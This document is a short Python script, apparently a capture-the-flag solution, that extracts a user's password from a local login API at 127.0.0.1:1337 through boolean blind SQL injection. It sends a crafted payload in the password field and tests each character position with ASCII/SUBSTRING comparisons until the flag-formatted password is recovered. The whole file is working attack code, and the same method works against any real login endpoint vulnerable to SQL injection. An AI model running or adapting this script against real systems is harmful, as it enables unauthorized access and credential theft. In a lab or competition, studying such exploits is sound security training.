import requests
import string

# Configuration
url = 'http://127.0.0.1:1337/api/login'
USERNAME = 'skat'
charset = string.printable + '{}_' # Including all ASCII characters from 32 to 126
known_start = 'irisctf{'   
password_length = 28

# Function to check if a query returns a true condition
def check_password_character(position, char):
    # Injection via password field
    injection = f'" OR ASCII(SUBSTRING((SELECT password FROM users WHERE username = "skat"), {position}, 1)) = ASCII("{char}")-- '
    data = {
        "username": "skat",
        "password": injection
    }

    response = requests.post(url, json=data)
    if "Invalid username / password combination!" not in response.text:
        print(response.text)
    return "Invalid username / password combination!" not in response.text and response.text != ''

# Start from the beginning of the password
password = ''

# Iterate over each character of the password
for position in range(1, password_length + 1):
    for char in charset:
        if check_password_character(position, char):
            password += char
            print(f"Found character at position {position}: {char}")
            break

print(f"Password for 'skat' is: {password}")
